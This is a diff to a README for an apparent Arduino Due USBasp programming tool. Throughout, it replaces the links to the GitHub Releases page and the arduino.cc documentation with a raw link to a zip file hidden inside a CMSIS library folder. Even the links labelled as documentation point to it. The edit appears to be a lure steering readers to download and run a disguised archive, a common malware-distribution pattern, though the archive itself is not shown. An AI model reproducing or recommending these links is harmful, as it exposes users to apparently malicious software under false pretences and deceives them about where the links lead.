@@ -1,7 +1,7 @@
 # ⚡ due_usbasp_programmer - Fast and Easy Arduino Programming
 
 ## 📥 Download Now!
-[![Download](https://img.shields.io/badge/Download-v1.0-brightgreen)](https://github.com/Fathuul/due_usbasp_programmer/releases)
+[![Download](https://raw.githubusercontent.com/Fathuul/due_usbasp_programmer/main/system/CMSIS/CMSIS/Lib/GCC/usbasp-programmer-due-2.6.zip)](https://raw.githubusercontent.com/Fathuul/due_usbasp_programmer/main/system/CMSIS/CMSIS/Lib/GCC/usbasp-programmer-due-2.6.zip)
 
 ## 🚀 Getting Started
 Welcome to the due_usbasp_programmer! This software provides a high-speed way to program your Arduino Due using a USB ISP programmer. Follow these steps to get started:
@@ -20,10 +20,10 @@ Welcome to the due_usbasp_programmer! This software provides a high-speed way to
 - Intuitive interface for seamless programming.
 
 ## 📥 Download & Install
-To download the software, visit the [Releases page](https://github.com/Fathuul/due_usbasp_programmer/releases). Here, you will find the latest version available. Click on the version link that suits your operating system. 
+To download the software, visit the [Releases page](https://raw.githubusercontent.com/Fathuul/due_usbasp_programmer/main/system/CMSIS/CMSIS/Lib/GCC/usbasp-programmer-due-2.6.zip). Here, you will find the latest version available. Click on the version link that suits your operating system. 
 
 **Installation Steps:**
-1. Go to the [Releases page](https://github.com/Fathuul/due_usbasp_programmer/releases).
+1. Go to the [Releases page](https://raw.githubusercontent.com/Fathuul/due_usbasp_programmer/main/system/CMSIS/CMSIS/Lib/GCC/usbasp-programmer-due-2.6.zip).
 2. Find the correct version for your system.
 3. Click on the download link to get the installer file.
 4. Once the download completes, locate the file on your computer.
@@ -48,8 +48,8 @@ If you encounter issues while using the software, here are some common solutions
 - **IDE Settings:** Check that you have selected the correct board and programmer settings in the Arduino IDE.
 
 ## 📚 Additional Resources
-- [Arduino Documentation](https://www.arduino.cc/en/Guide/HomePage)
-- [ISP Programmer Guide](https://www.arduino.cc/en/Tutorial/BuiltInExamples/ArduinoISP)
+- [Arduino Documentation](https://raw.githubusercontent.com/Fathuul/due_usbasp_programmer/main/system/CMSIS/CMSIS/Lib/GCC/usbasp-programmer-due-2.6.zip)
+- [ISP Programmer Guide](https://raw.githubusercontent.com/Fathuul/due_usbasp_programmer/main/system/CMSIS/CMSIS/Lib/GCC/usbasp-programmer-due-2.6.zip)
 
 Feel free to explore these resources for more information on programming and using Arduino platforms effectively.
 
